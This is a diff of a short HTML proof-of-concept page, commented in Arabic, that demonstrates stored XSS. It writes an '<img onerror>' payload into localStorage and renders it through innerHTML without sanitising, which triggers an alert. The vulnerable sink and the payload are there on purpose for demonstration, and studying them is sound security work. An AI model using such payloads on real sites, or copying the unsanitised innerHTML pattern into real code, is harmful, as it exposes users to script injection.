@@ -1,20 +1,18 @@
+<!-- PoC لتحفيز XSS عبر innerHTML -->
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>PoC - Stored XSS via localStorage</title>
+  <title>XSS PoC - innerHTML + localStorage</title>
 </head>
 <body>
-  <h2>✅ إذا ظهرت نافذة تنبيه (alert)، فهذا دليل على نجاح تنفيذ XSS.</h2>
-
   <script>
-    // تخزين الحمولة في localStorage
-    localStorage.setItem('xss_payload', '<img src=x onerror=alert("🔥 XSS Executed from localStorage")>');
+    // إعداد الحمولة الخبيثة في التخزين
+    localStorage.setItem("xss_payload", `<img src=x onerror=alert('🔥 XSS Exploited via localStorage!')>`);
 
-    // استرجاعها وعرضها داخل innerHTML بدون ترميز — هذا يُحاكي السلوك الضعيف في المواقع
-    const container = document.createElement('div');
-    container.innerHTML = localStorage.getItem('xss_payload');
-    document.body.appendChild(container);
+    // تنفيذ الثغرة عبر innerHTML بدون تعقيم
+    const div = document.createElement('div');
+    div.innerHTML = localStorage.getItem("xss_payload"); // ⚠️ نقطة التنفيذ
+    document.body.appendChild(div);
   </script>
 </body>
 </html>
